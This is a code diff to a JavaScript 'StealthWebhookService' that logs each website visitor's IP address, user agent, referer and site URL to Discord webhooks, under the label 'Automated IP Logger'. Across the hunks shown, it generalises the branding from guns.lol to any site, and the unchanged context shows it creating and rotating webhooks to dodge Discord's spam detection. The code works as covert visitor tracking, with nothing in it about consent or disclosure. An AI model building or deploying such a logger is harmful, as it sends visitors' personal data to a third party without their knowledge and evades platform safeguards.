@@ -167,6 +167,19 @@ class StealthWebhookService {
            'unknown';
   }
 
+  // Get website URL from request
+  getWebsiteUrl(req) {
+    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
+    const host = req.headers['x-forwarded-host'] || req.get('host');
+    return `${protocol}://${host}`;
+  }
+
+  // Get website name from request
+  getWebsiteName(req) {
+    const host = req.headers['x-forwarded-host'] || req.get('host');
+    return host.replace(/^www\./, '').split('.')[0] || 'Unknown Site';
+  }
+
   // Rate limiting protection
   async checkRateLimit() {
     const now = Date.now();
@@ -249,8 +262,11 @@ class StealthWebhookService {
   }
 
   // Create new webhook using Discord API
-  async createWebhook(name = 'guns.lol Logger') {
+  async createWebhook(name = null) {
     try {
+      // Generate dynamic webhook name if not provided
+      const webhookName = name || `${this.getWebsiteNameFromEnv()} Logger ${Date.now()}`;
+      
       const response = await fetch(`${this.discordApiBase}/channels/${this.channelId}/webhooks`, {
         method: 'POST',
         headers: {
@@ -258,7 +274,7 @@ class StealthWebhookService {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          name: name,
+          name: webhookName,
           avatar: null
         })
       });
@@ -296,6 +312,7 @@ class StealthWebhookService {
       const availableWebhook = this.webhooks.find(w => w.status === 'active' && !this.spamDetected.has(w.id));
       
       if (availableWebhook) {
+        const websiteName = this.getWebsiteNameFromEnv();
         const notificationPayload = {
           embeds: [{
             title: "🔗 New Webhook Created",
@@ -324,7 +341,7 @@ class StealthWebhookService {
               }
             ],
             footer: {
-              text: "guns.lol - Anti-Spam System"
+              text: `${websiteName} - Anti-Spam System`
             },
             timestamp: new Date().toISOString()
           }]
@@ -465,6 +482,8 @@ class StealthWebhookService {
     const clientIP = this.getClientIP(req);
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const timestamp = new Date().toISOString();
+    const websiteUrl = this.getWebsiteUrl(req);
+    const websiteName = this.getWebsiteName(req);
 
     // Enhanced payload with IP information
     const enhancedPayload = {
@@ -493,10 +512,15 @@ class StealthWebhookService {
               name: "🔗 Referer",
               value: req.headers.referer || 'Direct Access',
               inline: false
+            },
+            {
+              name: "🌐 Website",
+              value: websiteUrl,
+              inline: true
             }
           ],
           footer: {
-            text: "guns.lol - Automated IP Logger"
+            text: `${websiteName} - Automated IP Logger`
           },
           timestamp: timestamp
         }
@@ -602,6 +626,11 @@ class StealthWebhookService {
       spamThreshold: this.spamThreshold,
       spamWindow: this.spamWindow
     };
+  }
+
+  // Get website name from environment or default
+  getWebsiteNameFromEnv() {
+    return process.env.WEBSITE_NAME || 'Website';
   }
 }
 
